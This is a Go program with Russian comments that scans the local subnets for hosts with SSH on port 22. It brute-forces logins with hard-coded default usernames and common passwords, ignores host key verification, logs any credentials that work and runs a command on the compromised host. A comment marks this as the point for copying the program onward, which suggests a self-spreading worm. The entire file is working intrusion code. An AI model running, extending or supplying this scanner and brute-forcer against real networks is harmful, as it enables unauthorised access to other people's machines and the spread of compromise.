package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	username  = []string{"test", "root", "admin", "user"}
	passwords = []string{"123456", "egg", "password", "12345678", "qwerty", "11111111", "123456789", "12345", "1234", "111111", "1234567", "123123", "abc123", "12345678", "88888888", "qwerty1234", "qwerty12345678"}
)

func main() {
	// какая подсеть
	netIP := myNet()
	for _, ip := range netIP {
		log.Println("network ", ip)
	}

	// поиск хостов
	allHost := searchHosts(netIP)
	for _, ssh := range allHost {
		log.Println("host ", ssh)
	}

	// подбор пароля
	for _, sshHost := range allHost {

		for _, us := range username {

			for _, pas := range passwords {

				config := &ssh.ClientConfig{
					User: us,
					Auth: []ssh.AuthMethod{
						ssh.Password(pas),
					},
					Timeout:         10 * time.Second,
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				client, err := ssh.Dial("tcp", sshHost+":22", config)

				if err != nil {
					continue
				}

				log.Println("login: ", us, "password: ", pas, " OK")

				// копирование и ДАЛЬШЕ
				doIt(client)

				break
			}
		}
	}
}

// поиск подсетей
func myNet() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}

	result := make([]string, 0)

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				addr := net.ParseIP(ipnet.IP.String())
				mask := addr.DefaultMask()
				network := addr.Mask(mask)
				// docker network - not scan
				if !strings.Contains(network.String(), "172.17.0") {
					result = append(result, network.String())
				}
			}
		}
	}

	return result
}

// поиск хостов
func searchHosts(netIP []string) []string {
	allHosts := make([]string, 0)

	for _, host := range netIP {
		host = strings.TrimRight(host, "0")

		for i := 1; i < 254; i++ {
			conn, err := net.DialTimeout("tcp", host+strconv.Itoa(i)+":"+"22", time.Duration(1)*time.Millisecond)
			if err == nil {
				// отправка текста
				fmt.Fprintf(conn, "HELLO\r\n")
				buf := make([]byte, 0, 4096) // big buffer
				tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
				for {
					n, err := conn.Read(tmp)
					if err != nil {
						if err != io.EOF {
							fmt.Println("read error:", err)
						}
						break
					}
					buf = append(buf, tmp[:n]...)
				}
				conn.Close()
				allHosts = append(allHosts, host+strconv.Itoa(i))
			} else {
				continue
			}
		}
	}
	return allHosts
}

func doIt(client *ssh.Client) {
	session, err := client.NewSession()
	if err != nil {
		panic("Failed to create session: " + err.Error())
	}
	defer session.Close()

	var b bytes.Buffer
	session.Stdout = &b
	if err := session.Run("/usr/bin/whoami"); err != nil {
		panic("Failed to run: " + err.Error())
	}

	fmt.Println(b.String())

	os.Exit(0)
}
